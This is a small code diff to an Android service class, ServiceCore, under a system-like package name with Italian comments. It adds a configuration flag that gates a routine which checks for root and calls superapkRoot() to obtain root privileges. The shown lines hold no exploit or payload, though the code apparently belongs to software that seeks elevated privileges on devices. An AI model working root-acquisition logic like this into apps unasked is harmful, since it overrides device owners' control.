@@ -41,6 +41,7 @@ import android.widget.Toast;
 
 import com.android.service.auto.Cfg;
 import com.android.service.capabilities.PackageInfo;
+import com.android.service.crypto.Keys;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -130,7 +131,7 @@ public class ServiceCore extends Service {
 		// Abbiamo la root?
 		Status.self().setRoot(PackageInfo.checkRoot());
 
-		if (Status.self().haveSu() == true && Status.self().haveRoot() == false) {
+		if (Status.self().haveSu() == true && Status.self().haveRoot() == false && Keys.self().wantsPrivilege()) {
 			// Ask the user...
 			superapkRoot();
 
